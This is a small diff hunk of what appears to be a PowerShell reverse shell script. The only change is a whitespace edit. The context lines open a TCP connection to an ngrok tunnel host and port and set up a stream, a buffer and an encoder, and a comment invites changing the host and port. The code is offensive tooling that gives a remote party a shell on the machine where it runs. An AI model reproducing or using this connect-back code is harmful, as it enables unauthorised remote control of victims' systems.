@@ -6,7 +6,7 @@ $data = $null;
 $result = $null;
 try {
 	# change the host address and/or port number as necessary
-	$client = New-Object Net.Sockets.TcpClient("4.tcp.ngrok.io", 10590);
+	$client = New-Object Net.Sockets.TcpClient("4.tcp.ngrok.io",10590);
 	$stream = $client.GetStream();
 	$buffer = New-Object Byte[] 1024;
 	$encoding = New-Object Text.AsciiEncoding;
